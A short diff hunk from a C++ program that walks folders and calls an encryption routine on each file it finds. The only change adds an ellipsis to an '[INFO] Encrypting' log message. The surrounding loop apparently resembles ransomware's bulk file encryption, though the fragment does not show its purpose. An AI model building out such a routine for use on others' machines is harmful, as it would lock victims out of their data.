@@ -44,7 +44,7 @@ void exploreFolder(std::string path)
         }
         else
         {
-            std::cout << "[INFO] Encrypting " << path + file << std::endl;
+            std::cout << "[INFO] Encrypting " << path + file << "..." << std::endl;
             cryptFile(path + file);
         }
     }
